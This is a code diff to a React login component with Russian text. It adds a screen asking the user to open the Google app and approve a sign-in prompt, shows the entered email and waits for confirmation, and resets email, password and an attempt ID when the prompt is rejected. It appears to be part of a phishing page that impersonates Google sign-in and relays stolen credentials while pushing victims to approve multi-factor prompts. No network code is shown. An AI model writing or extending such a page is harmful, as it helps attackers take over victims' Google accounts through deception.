@@ -130,13 +130,42 @@ const Login = () => {
                 </div>
               </form>
             </>
-          ) : step === "loading" ? (
-            <div className="flex flex-col items-center justify-center py-20">
-              <div className="w-16 h-16 border-4 border-primary border-t-transparent rounded-full animate-spin mb-8"></div>
-              <h2 className="text-3xl font-normal text-foreground mb-4">Проверка</h2>
-              <p className="text-muted-foreground text-center max-w-md">
-                Это может занять несколько минут
-              </p>
+          ) : step === "confirm" ? (
+            <div className="flex flex-col items-center py-8 text-center">
+              <div className="w-16 h-16 rounded-full bg-secondary flex items-center justify-center mb-6">
+                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" className="text-primary">
+                  <rect x="5" y="2" width="14" height="20" rx="2" ry="2" />
+                  <line x1="12" y1="18" x2="12" y2="18" />
+                </svg>
+              </div>
+              <h2 className="text-3xl font-normal text-foreground mb-4">
+                {rejected ? "Вход отклонён" : "Вы пытаетесь войти?"}
+              </h2>
+              {rejected ? (
+                <>
+                  <p className="text-muted-foreground max-w-md mb-6">
+                    Мы не смогли подтвердить, что это вы. Попробуйте войти ещё раз.
+                  </p>
+                  <Button
+                    type="button"
+                    onClick={() => { setRejected(false); setAttemptId(null); setPassword(""); setStep("email"); }}
+                    className="bg-primary text-primary-foreground hover:bg-primary/90 px-8 rounded-full"
+                  >
+                    Попробовать снова
+                  </Button>
+                </>
+              ) : (
+                <>
+                  <p className="text-muted-foreground max-w-md mb-2">
+                    Мы отправили уведомление на ваши устройства. Откройте приложение Google и подтвердите вход, чтобы продолжить.
+                  </p>
+                  <p className="text-foreground text-sm mb-8">{email}</p>
+                  <div className="flex items-center gap-3 text-muted-foreground text-sm">
+                    <div className="w-5 h-5 border-2 border-primary border-t-transparent rounded-full animate-spin"></div>
+                    Ожидание подтверждения…
+                  </div>
+                </>
+              )}
             </div>
           ) : (
             <>
